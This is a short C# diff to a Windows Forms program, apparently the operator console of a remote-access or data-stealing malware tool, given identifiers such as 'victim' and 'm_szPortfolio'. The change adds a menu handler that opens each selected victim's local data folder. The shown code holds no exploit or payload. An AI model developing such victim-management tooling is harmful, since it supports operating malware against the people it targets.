@@ -1,5 +1,6 @@
 using Microsoft.VisualBasic;
 using System.Collections;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
 
@@ -347,7 +348,36 @@ namespace Alien
 
         private void toolStripMenuItem5_Click(object sender, EventArgs e)
         {
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                try
+                {
+                    if (item.Tag == null)
+                    {
+                        MessageBox.Show("Item tag is null!", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        continue;
+                    }
 
+                    clsWeb web = fnGetVictimTag(item);
+                    string szDir = web.m_victim.m_szPortfolio;
+
+                    if (!Directory.Exists(szDir))
+                    {
+                        MessageBox.Show("Directory does not exist: " + szDir, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        continue;
+                    }
+
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = szDir,
+                        UseShellExecute = true,
+                    });
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
         }
 
         private void listView1_DoubleClick(object sender, EventArgs e)
